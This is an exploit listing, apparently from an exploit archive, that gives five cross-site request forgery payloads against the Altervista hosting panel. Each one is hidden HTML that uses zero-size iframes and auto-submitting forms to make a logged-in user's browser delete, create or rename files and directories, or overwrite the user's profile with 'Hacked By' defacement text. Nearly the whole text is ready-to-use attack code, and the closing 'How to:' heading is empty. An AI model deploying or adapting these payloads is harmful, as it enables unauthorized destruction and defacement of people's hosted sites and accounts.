#1 - Delete File or directory

<html>
<iframe src="http://[server].altervista.org/canc.pl?sid=&FH0=[filename]&Conferma=1" height=0 width=0>
</html>

#2 - Make Directory

<html>
<iframe name="asd" frameborder="0" height="0" width="0"></iframe> 
<form name="lol" action="http://[server].altervista.org/makedir.pl?sid=" target="asd" method=post>
<input type=hidden name="DIR_Nuova" value="[directory name]">
</form><script>document.lol.submit()</script>
</html>

#3 - Make File

<html>
<iframe name="asd" frameborder="0" height="0" width="0"></iframe>
<form method="post" action="http://[server].altervista.org/salva.pl?sid=" name="lol" target="asd">
<input name="testo" wrap="virtual" type=hidden value="[FILE TEXT]">
<input name="FH" value="[FILE NAME]" type=hidden>
</form><script>document.lol.submit()</script>
</html>

-or-

<iframe name="iframe" frameborder="no" height="0" width="0" src='http://[server].altervista.org/salva.pl?sid=%20&testo=[FILE TEXT]&FH=[FILE NAME]'></iframe>

#4 - Rename File or direcroty

<html>
<iframe name="asd" frameborder="0" height="0" width="0"></iframe>
<form method="post" action="http://[server].altervista.org/rinomina.pl?sid=" name="lol" target="asd">
<input type="hidden" name="FHOLD" value="[OLD FILE NAME]">
<input name="FH" value="[NEW FILE NAME]" type="hidden">
<input type="hidden" name="Conferma" value="1">
</form><script>document.lol.submit()</script>
</html>

#5 - Change Personal Info

<html>
<iframe name="asd" frameborder="0" height="0" width="0"></iframe>
<form name="dati" method="post" action="http://[server].altervista.org/salva_profilo.pl?sid=" name="lol" target="asd">
<input type="hidden" name="Azione" value="cambia_dati">
<input type="hidden" name="NomeCompleto" value="Hacked By KiNgOfThEwOrLd">
<input type="hidden" name="Indirizzo" value="Via You Just Got Owned 5">
<input class=text type=hidden name="Citt" VALUE="milano">
<input type="hidden" name="Provincia" value="MI">
<input type="hidden" name="Cap" value="20147">
<input type="hidden" name="Tel" value="N/D">
</form><script>document.lol.submit()</script>
</html>

# How to:

